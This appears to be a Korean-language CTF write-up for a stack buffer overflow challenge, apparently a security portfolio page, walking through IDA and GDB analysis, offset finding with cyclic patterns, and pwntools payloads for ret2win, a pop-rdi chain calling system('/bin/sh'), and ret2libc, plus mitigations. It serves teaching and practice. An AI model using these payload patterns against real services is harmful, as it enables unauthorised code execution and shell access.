@@ -1,0 +1,176 @@
+<h1 id="section-1">BOF11 라이트업 - IDA + GDB 분석 흐름</h1>
+<h2 id="section-2">1. 개요</h2>
+<p>BOF11은 단순히 입력을 길게 넣어 크래시를 내는 문제가 아니라, IDA로 함수 흐름을 먼저 보고 GDB에서 런타임
+상태를 검증하는 방식으로 정리한 학습형 라이트업이다. 정적 분석으로 취약 후보를 좁히고, 동적 분석으로
+실제 덮이는 위치와 exploit 가능성을 확인하는 데 초점을 맞췄다.</p>
+<h2 id="section-3">2. 분석 목표</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>항목</th>
+<th>내용</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>취약점 유형</td>
+<td>Stack BOF / 제어 흐름 변조</td>
+</tr>
+<tr>
+<td>정적 분석</td>
+<td>IDA Free, strings, xrefs, decompile view</td>
+</tr>
+<tr>
+<td>동적 분석</td>
+<td>GDB, pwndbg, cyclic pattern</td>
+</tr>
+<tr>
+<td>exploit 방향</td>
+<td>ret2win 또는 ROP/ret2libc 후보 판단</td>
+</tr>
+<tr>
+<td>핵심 포인트</td>
+<td>IDA 결과를 GDB에서 검증하는 습관</td>
+</tr>
+</tbody></table></div>
+<h2 id="section-4">3. 전체 흐름</h2>
+<pre><code class="language-text">checksec로 보호기법 확인
+  -&gt; IDA에서 main과 입력 함수 확인
+  -&gt; 문자열과 xref로 성공 함수 후보 확인
+  -&gt; 취약 입력 길이와 버퍼 크기 비교
+  -&gt; GDB cyclic으로 offset 확인
+  -&gt; 목표 주소 또는 ROP 체인 구성
+  -&gt; exploit.py 작성
+</code></pre>
+<h2 id="section-5">4. 보호기법 확인</h2>
+<pre><code class="language-bash">checksec ./bof11
+</code></pre>
+<p>보호기법에 따라 풀이 방향이 달라진다.</p>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>보호기법</th>
+<th>의미</th>
+<th>풀이 영향</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Canary</td>
+<td>RET 앞 변조 탐지</td>
+<td>leak 또는 우회 필요</td>
+</tr>
+<tr>
+<td>NX</td>
+<td>스택 실행 방지</td>
+<td>shellcode보다 ROP/ret2libc</td>
+</tr>
+<tr>
+<td>PIE</td>
+<td>바이너리 주소 랜덤화</td>
+<td>base leak 필요</td>
+</tr>
+<tr>
+<td>RELRO</td>
+<td>GOT overwrite 제한</td>
+<td>ROP/ret2libc로 전환</td>
+</tr>
+</tbody></table></div>
+<h2 id="section-6">5. IDA 정적 분석</h2>
+<p>IDA에서 먼저 확인한 것은 입력 함수와 성공 조건이다.</p>
+<pre><code class="language-text">main()
+  -&gt; banner 출력
+  -&gt; vulnerable_function()
+  -&gt; 입력 수신
+  -&gt; 조건 만족 시 win()/print_flag() 호출
+</code></pre>
+<p>정적 분석 체크포인트:</p>
+<ul>
+<li><code>gets</code>, <code>scanf("%s")</code>, <code>read</code>, <code>fgets</code> 길이 확인</li>
+<li>지역 변수 크기와 입력 길이 비교</li>
+<li><code>win</code>, <code>shell</code>, <code>print_flag</code>, <code>system</code> 문자열 xref 확인</li>
+<li>함수 인자가 필요한지 확인</li>
+<li>64-bit 호출 규약상 RDI/RSI/RDX 세팅이 필요한지 확인</li>
+</ul>
+<p>IDA에서 취약 후보를 찾은 뒤에는 바로 exploit을 쓰지 않고, GDB에서 실제 스택 배치가 예상과 맞는지 확인했다.</p>
+<h2 id="section-7">6. GDB 동적 분석</h2>
+<pre><code class="language-gdb">gdb ./bof11
+pwndbg&gt; disassemble vulnerable_function
+pwndbg&gt; break *vulnerable_function
+pwndbg&gt; run
+</code></pre>
+<p>입력 지점에 cyclic pattern을 넣고 크래시 후 레지스터와 스택을 확인한다.</p>
+<pre><code class="language-bash">python3 - &lt;&lt;'PY'
+from pwn import *
+print(cyclic(200).decode())
+PY
+</code></pre>
+<pre><code class="language-gdb">pwndbg&gt; x/20gx $rsp
+pwndbg&gt; info registers
+</code></pre>
+<p>offset은 <code>cyclic -l</code>로 계산한다.</p>
+<pre><code class="language-bash">cyclic -l &lt;pattern&gt;
+</code></pre>
+<p>이 과정을 통해 IDA에서 본 버퍼 크기와 실제 return address까지의 거리가 같은지 검증한다.</p>
+<h2 id="section-8">7. exploit 방향 판단</h2>
+<h3 id="section-9">7.1 ret2win 가능</h3>
+<p>PIE가 꺼져 있고 <code>win()</code> 함수가 존재하면 가장 단순한 흐름은 ret2win이다.</p>
+<pre><code class="language-python">payload = b"A" * offset
+payload += p64(elf.symbols["win"])
+</code></pre>
+<h3 id="section-10">7.2 인자가 필요한 함수</h3>
+<p>성공 함수가 특정 인자를 요구하면 <code>pop rdi; ret</code> gadget을 사용한다.</p>
+<pre><code class="language-python">payload = b"A" * offset
+payload += p64(pop_rdi)
+payload += p64(next(elf.search(b"/bin/sh")))
+payload += p64(elf.symbols["system"])
+</code></pre>
+<h3 id="section-11">7.3 ASLR/PIE가 있는 경우</h3>
+<p>주소가 랜덤화되어 있으면 leak이 먼저다.</p>
+<pre><code class="language-text">puts@got leak
+  -&gt; libc_base 계산
+  -&gt; system, "/bin/sh" 주소 계산
+  -&gt; ret2libc payload 구성
+</code></pre>
+<h2 id="section-12">8. exploit.py 구조</h2>
+<pre><code class="language-python">from pwn import *
+
+binary = "./bof11"
+elf = ELF(binary)
+context.binary = elf
+
+offset = &lt;offset&gt;
+
+def start():
+    if args.REMOTE:
+        return remote("&lt;host&gt;", &lt;port&gt;)
+    return process(binary)
+
+p = start()
+
+payload = b"A" * offset
+payload += p64(&lt;target_or_gadget&gt;)
+
+p.sendlineafter(b"&gt; ", payload)
+p.interactive()
+</code></pre>
+<p>실제 주소와 플래그 값은 포트폴리오에 공개하지 않고, exploit 구조와 판단 근거만 남긴다.</p>
+<h2 id="section-13">9. 실수했던 지점</h2>
+<ul>
+<li>IDA에서 보이는 버퍼 크기만 보고 offset을 확정하면 saved RBP, alignment 때문에 틀릴 수 있다.</li>
+<li>64-bit 환경에서는 함수 호출 전 stack alignment가 깨져 <code>system()</code> 호출이 실패할 수 있다.</li>
+<li>PIE가 켜져 있으면 IDA에 보이는 주소는 실제 런타임 주소가 아니므로 base 계산이 필요하다.</li>
+<li><code>win()</code> 함수가 보여도 인자 조건이 있으면 단순 RET 덮기만으로는 성공하지 않는다.</li>
+</ul>
+<h2 id="section-14">10. 대응 방안</h2>
+<ul>
+<li>안전한 입력 함수 사용과 길이 제한</li>
+<li>컴파일 보호기법 활성화: Canary, PIE, NX, RELRO</li>
+<li>민감 함수나 debug/helper 함수가 릴리즈 바이너리에 남지 않도록 제거</li>
+<li>크래시 로그, 비정상 길이 입력, 반복 시도를 모니터링</li>
+</ul>
+<h2 id="section-15">11. 학습한 점</h2>
+<ul>
+<li>IDA는 “어디가 수상한지”를 찾는 도구이고, GDB는 “실제로 덮이는지”를 확인하는 도구다.</li>
+<li>BOF 문제는 보호기법에 따라 ret2win, ROP, ret2libc로 풀이 방향을 빠르게 바꿔야 한다.</li>
+<li>exploit 코드는 짧아 보여도, 그 앞의 offset 검증과 주소 판단이 대부분의 시간을 차지한다.</li>
+<li>보고서에는 exploit 성공만 적는 것보다 왜 그 공격 루틴을 골랐는지 설명하는 것이 더 중요하다.</li>
+</ul>
